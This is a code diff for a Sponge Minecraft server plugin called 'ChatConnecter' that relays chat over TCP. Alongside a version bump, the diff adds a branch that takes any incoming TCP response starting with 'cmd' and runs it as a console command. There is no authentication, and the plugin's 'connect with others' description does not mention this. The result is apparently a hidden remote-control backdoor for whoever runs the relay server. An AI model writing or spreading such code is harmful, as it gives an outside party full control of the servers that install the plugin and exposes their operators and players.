@@ -27,7 +27,7 @@ import java.net.*;
 @Plugin(
         id = "chatconnecter",
         name = "ChatConnecter",
-        version = "1.0.0",
+        version = "1.0.1",
         description = "connect with others"
 )
 public class ChatConnecter {
@@ -60,6 +60,7 @@ public class ChatConnecter {
     public void onMessage(MessageEvent event)
     {
         String message = event.getMessage().toPlain();
+
         if(message.indexOf("<") == 0 || message.indexOf("[") == 0)
             SendTcp("m"+message);
     }
@@ -161,13 +162,17 @@ class Client {
                     byte[] resp = new byte[size];
                     is.read(resp);
                     String response = new String(resp,"utf8");
-                    try{
-                        MessageChannel.TO_ALL.send(Text.of(response));
+                    try {
+                        if(response.indexOf("cmd") == 0)
+                        {
+                            Sponge.getCommandManager().process(Sponge.getServer().getConsole(), response.substring(3));
+                        }
+                        else{
+                            MessageChannel.TO_ALL.send(Text.of(response));
+                        }
+                    }catch (Exception e){
+                        e.printStackTrace();
                     }
-                    catch (Exception e){
-
-                    }
-                    //Logger.info("receive data:" + response);
                 } catch (Exception e) {
                     //e.printStackTrace();
                     System.out.println("socket error");
